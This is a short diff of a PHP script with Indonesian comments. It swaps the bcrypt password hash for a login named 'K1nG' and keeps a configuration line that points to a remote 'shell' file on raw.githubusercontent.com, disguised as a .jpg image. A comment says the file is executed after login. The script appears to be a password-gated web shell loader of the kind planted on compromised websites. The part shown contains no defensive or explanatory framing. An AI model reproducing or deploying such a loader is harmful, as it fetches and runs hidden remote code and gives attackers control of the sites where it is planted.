@@ -3,7 +3,7 @@ session_start();
 
 // ================== KONFIGURASI ==================
 $username    = "K1nG";
-$passwordHash = '$2a$20$zh1tAXTIZ2DgqPVtrcBu9uVS8AUBGK7WdcZLI6KJb6SnNGoMaJz7K'; // bcrypt hash
+$passwordHash = '$2a$19$8EY0PGbMvXLnQGiMty33X.XcbJDpeT0wyyv0QHODXkTAbVyh9vmfG'; // bcrypt hash
 
 // URL shell yang akan dieksekusi setelah login
 $shell_url = 'https://raw.githubusercontent.com/lype2/LypeSession/refs/heads/main/lype404.jpg';
